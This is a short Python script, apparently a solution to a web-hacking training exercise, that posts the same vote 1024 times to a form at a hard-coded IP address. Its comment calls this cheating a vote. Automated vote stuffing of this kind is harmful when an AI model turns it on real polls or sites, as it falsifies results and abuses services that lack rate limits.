#!/usr/bin/python3
#cheat vote is fun
import requests

url = "http://158.69.76.135/level0.php"
id = int(input("enter your id:\n"))
for req in range(1024):
    requests.post(url, data={
        'id': id,
        'holdthedoor': "Submit"
    })
